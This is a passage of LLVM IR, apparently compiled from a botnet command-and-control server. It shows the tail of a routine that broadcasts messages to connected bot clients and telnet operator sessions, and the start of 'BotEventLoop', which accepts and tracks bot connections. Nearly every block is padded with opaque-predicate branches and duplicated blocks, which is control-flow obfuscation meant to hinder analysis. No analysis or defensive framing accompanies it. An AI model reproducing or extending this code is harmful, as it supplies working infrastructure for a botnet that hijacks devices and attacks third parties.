  %54 = call i64 @time(i64* %9) #7
  %55 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %55, %struct.tm** %10, align 8
  %56 = load %struct.tm*, %struct.tm** %10, align 8
  %57 = call i8* @asctime(%struct.tm* %56) #7
  store i8* %57, i8** %11, align 8
  %58 = load i8*, i8** %11, align 8
  call void @trim(i8* %58)
  store i32 0, i32* %12, align 4
  %59 = load i32, i32* @x.3
  %60 = load i32, i32* @y.4
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart217, label %originalBB1alteredBB

originalBBpart217:                                ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %248, %originalBBpart217
  %68 = load i32, i32* %12, align 4
  %69 = icmp slt i32 %68, 1000000
  br i1 %69, label %70, label %251

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* @x.3
  %72 = load i32, i32* @y.4
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %70
  %79 = load i32, i32* %12, align 4
  %80 = load i32, i32* %5, align 4
  %81 = icmp eq i32 %79, %80
  %82 = load i32, i32* @x.3
  %83 = load i32, i32* @y.4
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %81, label %123, label %90

; <label>:90:                                     ; preds = %originalBBpart221
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %93, i32 0, i32 1
  %95 = load i8, i8* %94, align 4
  %96 = icmp ne i8 %95, 0
  br i1 %96, label %124, label %97

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* @x.3
  %99 = load i32, i32* @y.4
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %97
  %106 = load i32, i32* %7, align 4
  %107 = icmp eq i32 %106, 0
  %108 = load i32, i32* @x.3
  %109 = load i32, i32* @y.4
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %107, label %123, label %116

; <label>:116:                                    ; preds = %originalBBpart225
  %117 = load i32, i32* %12, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %124, label %123

; <label>:123:                                    ; preds = %116, %originalBBpart225, %originalBBpart221
  br label %248

; <label>:124:                                    ; preds = %116, %90
  %125 = load i32, i32* @x.3
  %126 = load i32, i32* @y.4
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %124
  %133 = load i32, i32* %7, align 4
  %134 = icmp ne i32 %133, 0
  %135 = load i32, i32* @x.3
  %136 = load i32, i32* @y.4
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %134, label %143, label %192

; <label>:143:                                    ; preds = %originalBBpart229
  %144 = load i32, i32* @x.3
  %145 = load i32, i32* @y.4
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %143
  %152 = load i32, i32* %12, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 4
  %157 = icmp ne i32 %156, 0
  %158 = load i32, i32* @x.3
  %159 = load i32, i32* @y.4
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %157, label %166, label %192

; <label>:166:                                    ; preds = %originalBBpart233
  %167 = load i32, i32* @x.3
  %168 = load i32, i32* @y.4
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %166
  %175 = load i32, i32* %12, align 4
  %176 = call i64 @send(i32 %175, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %177 = load i32, i32* %12, align 4
  %178 = load i8*, i8** %6, align 8
  %179 = load i8*, i8** %6, align 8
  %180 = call i64 @strlen(i8* %179) #8
  %181 = call i64 @send(i32 %177, i8* %178, i64 %180, i32 16384)
  %182 = load i32, i32* %12, align 4
  %183 = call i64 @send(i32 %182, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  %184 = load i32, i32* @x.3
  %185 = load i32, i32* @y.4
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %192

; <label>:192:                                    ; preds = %originalBBpart237, %originalBBpart233, %originalBBpart229
  %193 = load i32, i32* @x.3
  %194 = load i32, i32* @y.4
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %192
  %201 = load i32, i32* %12, align 4
  %202 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %201)
  %203 = load i32, i32* %12, align 4
  %204 = load i8*, i8** %4, align 8
  %205 = load i8*, i8** %4, align 8
  %206 = call i64 @strlen(i8* %205) #8
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  %208 = load i32, i32* %7, align 4
  %209 = icmp ne i32 %208, 0
  %210 = load i32, i32* @x.3
  %211 = load i32, i32* @y.4
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %209, label %218, label %228

; <label>:218:                                    ; preds = %originalBBpart241
  %219 = load i32, i32* %12, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %220
  %222 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 4
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %225, label %228

; <label>:225:                                    ; preds = %218
  %226 = load i32, i32* %12, align 4
  %227 = call i64 @send(i32 %226, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  br label %231

; <label>:228:                                    ; preds = %218, %originalBBpart241
  %229 = load i32, i32* %12, align 4
  %230 = call i64 @send(i32 %229, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  br label %231

; <label>:231:                                    ; preds = %228, %225
  %232 = load i32, i32* @x.3
  %233 = load i32, i32* @y.4
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %231
  %240 = load i32, i32* @x.3
  %241 = load i32, i32* @y.4
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %248

; <label>:248:                                    ; preds = %originalBBpart245, %123
  %249 = load i32, i32* %12, align 4
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %12, align 4
  br label %67

; <label>:251:                                    ; preds = %67
  %252 = load i8*, i8** %8, align 8
  call void @free(i8* %252) #7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %253 = load i8*, i8** %4, align 8
  %254 = call i64 @strlen(i8* %253) #8
  %_ = sub i64 0, %254
  %gen = add i64 %_, 10
  %_2 = sub i64 0, %254
  %gen3 = add i64 %_2, 10
  %_4 = sub i64 0, %254
  %gen5 = add i64 %_4, 10
  %_6 = sub i64 %254, 10
  %gen7 = mul i64 %_6, 10
  %_8 = sub i64 0, %254
  %gen9 = add i64 %_8, 10
  %255 = add i64 %254, 10
  %256 = call noalias i8* @malloc(i64 %255) #7
  store i8* %256, i8** %8, align 8
  %257 = load i8*, i8** %8, align 8
  %258 = load i8*, i8** %4, align 8
  %259 = call i64 @strlen(i8* %258) #8
  %_10 = sub i64 %259, 10
  %gen11 = mul i64 %_10, 10
  %_12 = shl i64 %259, 10
  %_13 = shl i64 %259, 10
  %_14 = sub i64 %259, 10
  %gen15 = mul i64 %_14, 10
  %260 = add i64 %259, 10
  call void @llvm.memset.p0i8.i64(i8* %257, i8 0, i64 %260, i32 1, i1 false)
  %261 = load i8*, i8** %8, align 8
  %262 = load i8*, i8** %4, align 8
  %263 = call i8* @strcpy(i8* %261, i8* %262) #7
  %264 = load i8*, i8** %8, align 8
  call void @trim(i8* %264)
  %265 = call i64 @time(i64* %9) #7
  %266 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %266, %struct.tm** %10, align 8
  %267 = load %struct.tm*, %struct.tm** %10, align 8
  %268 = call i8* @asctime(%struct.tm* %267) #7
  store i8* %268, i8** %11, align 8
  %269 = load i8*, i8** %11, align 8
  call void @trim(i8* %269)
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB19alteredBB:                            ; preds = %originalBB19, %70
  %270 = load i32, i32* %12, align 4
  %271 = load i32, i32* %5, align 4
  %272 = icmp eq i32 %270, %271
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %97
  %273 = load i32, i32* %7, align 4
  %274 = icmp eq i32 %273, 0
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %124
  %275 = load i32, i32* %7, align 4
  %276 = icmp ne i32 %275, 0
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %143
  %277 = load i32, i32* %12, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %278
  %280 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = icmp ne i32 %281, 0
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %166
  %283 = load i32, i32* %12, align 4
  %284 = call i64 @send(i32 %283, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %285 = load i32, i32* %12, align 4
  %286 = load i8*, i8** %6, align 8
  %287 = load i8*, i8** %6, align 8
  %288 = call i64 @strlen(i8* %287) #8
  %289 = call i64 @send(i32 %285, i8* %286, i64 %288, i32 16384)
  %290 = load i32, i32* %12, align 4
  %291 = call i64 @send(i32 %290, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %192
  %292 = load i32, i32* %12, align 4
  %293 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %292)
  %294 = load i32, i32* %12, align 4
  %295 = load i8*, i8** %4, align 8
  %296 = load i8*, i8** %4, align 8
  %297 = call i64 @strlen(i8* %296) #8
  %298 = call i64 @send(i32 %294, i8* %295, i64 %297, i32 16384)
  %299 = load i32, i32* %7, align 4
  %300 = icmp ne i32 %299, 0
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %231
  br label %originalBB43
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  br label %24

; <label>:24:                                     ; preds = %586, %1
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %28

; <label>:28:                                     ; preds = %originalBBpart280, %24
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %586

; <label>:32:                                     ; preds = %28
  %33 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i64 %35
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %36, i32 0, i32 0
  %38 = load i32, i32* %37, align 1
  %39 = and i32 %38, 8
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %59, label %41

; <label>:41:                                     ; preds = %32
  %42 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %43 = load i32, i32* %8, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i64 %44
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 1
  %48 = and i32 %47, 16
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %59, label %50

; <label>:50:                                     ; preds = %41
  %51 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %52 = load i32, i32* %8, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %51, i64 %53
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 1
  %57 = and i32 %56, 1
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %78, label %59

; <label>:59:                                     ; preds = %50, %41, %32
  %60 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i64 %62
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %63, i32 0, i32 1
  %65 = bitcast %union.epoll_data* %64 to i32*
  %66 = load i32, i32* %65, align 1
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %68, i32 0, i32 1
  store i8 0, i8* %69, align 4
  %70 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %70, i64 %72
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %73, i32 0, i32 1
  %75 = bitcast %union.epoll_data* %74 to i32*
  %76 = load i32, i32* %75, align 1
  %77 = call i32 @close(i32 %76)
  br label %567

; <label>:78:                                     ; preds = %50
  %79 = load volatile i32, i32* @listenFD, align 4
  %80 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %80, i64 %82
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %83, i32 0, i32 1
  %85 = bitcast %union.epoll_data* %84 to i32*
  %86 = load i32, i32* %85, align 1
  %87 = icmp eq i32 %79, %86
  br i1 %87, label %88, label %379

; <label>:88:                                     ; preds = %78
  %89 = load i32, i32* @x.5
  %90 = load i32, i32* @y.6
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %88
  %97 = load i32, i32* @x.5
  %98 = load i32, i32* @y.6
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %105

; <label>:105:                                    ; preds = %originalBBpart240, %283, %280, %originalBBpart2
  store i32 16, i32* %10, align 4
  %106 = load volatile i32, i32* @listenFD, align 4
  %107 = call i32 @accept(i32 %106, %struct.sockaddr* %9, i32* %10)
  store i32 %107, i32* %11, align 4
  %108 = load i32, i32* %11, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %136

; <label>:110:                                    ; preds = %105
  %111 = call i32* @__errno_location() #9
  %112 = load i32, i32* %111, align 4
  %113 = icmp eq i32 %112, 11
  br i1 %113, label %118, label %114

; <label>:114:                                    ; preds = %110
  %115 = call i32* @__errno_location() #9
  %116 = load i32, i32* %115, align 4
  %117 = icmp eq i32 %116, 11
  br i1 %117, label %118, label %135

; <label>:118:                                    ; preds = %114, %110
  %119 = load i32, i32* @x.5
  %120 = load i32, i32* @y.6
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %118
  %127 = load i32, i32* @x.5
  %128 = load i32, i32* @y.6
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %362

; <label>:135:                                    ; preds = %114
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  br label %362

; <label>:136:                                    ; preds = %105
  %137 = load i32, i32* @x.5
  %138 = load i32, i32* @y.6
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %136
  %145 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %145, i32 0, i32 2
  %147 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 2
  %149 = load i32, i32* %11, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %150
  %152 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %151, i32 0, i32 0
  store i32 %148, i32* %152, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  %153 = load i32, i32* @x.5
  %154 = load i32, i32* @y.6
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %161

; <label>:161:                                    ; preds = %254, %originalBBpart28
  %162 = load i32, i32* @x.5
  %163 = load i32, i32* @y.6
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %161
  %170 = load i32, i32* %12, align 4
  %171 = icmp slt i32 %170, 1000000
  %172 = load i32, i32* @x.5
  %173 = load i32, i32* @y.6
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %171, label %180, label %257

; <label>:180:                                    ; preds = %originalBBpart212
  %181 = load i32, i32* %12, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %182
  %184 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %183, i32 0, i32 1
  %185 = load i8, i8* %184, align 4
  %186 = icmp ne i8 %185, 0
  br i1 %186, label %187, label %191

; <label>:187:                                    ; preds = %180
  %188 = load i32, i32* %12, align 4
  %189 = load i32, i32* %11, align 4
  %190 = icmp eq i32 %188, %189
  br i1 %190, label %191, label %192

; <label>:191:                                    ; preds = %187, %180
  br label %254

; <label>:192:                                    ; preds = %187
  %193 = load i32, i32* @x.5
  %194 = load i32, i32* @y.6
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %192
  %201 = load i32, i32* %12, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %207
  %209 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 8
  %211 = icmp eq i32 %205, %210
  %212 = load i32, i32* @x.5
  %213 = load i32, i32* @y.6
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %211, label %220, label %237

; <label>:220:                                    ; preds = %originalBBpart216
  %221 = load i32, i32* @x.5
  %222 = load i32, i32* @y.6
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %220
  store i32 1, i32* %13, align 4
  %229 = load i32, i32* @x.5
  %230 = load i32, i32* @y.6
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %257

; <label>:237:                                    ; preds = %originalBBpart216
  %238 = load i32, i32* @x.5
  %239 = load i32, i32* @y.6
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %237
  %246 = load i32, i32* @x.5
  %247 = load i32, i32* @y.6
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %254

; <label>:254:                                    ; preds = %originalBBpart224, %191
  %255 = load i32, i32* %12, align 4
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %12, align 4
  br label %161

; <label>:257:                                    ; preds = %originalBBpart220, %originalBBpart212
  %258 = load i32, i32* %13, align 4
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %260, label %286

; <label>:260:                                    ; preds = %257
  %261 = load i32, i32* @x.5
  %262 = load i32, i32* @y.6
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %260
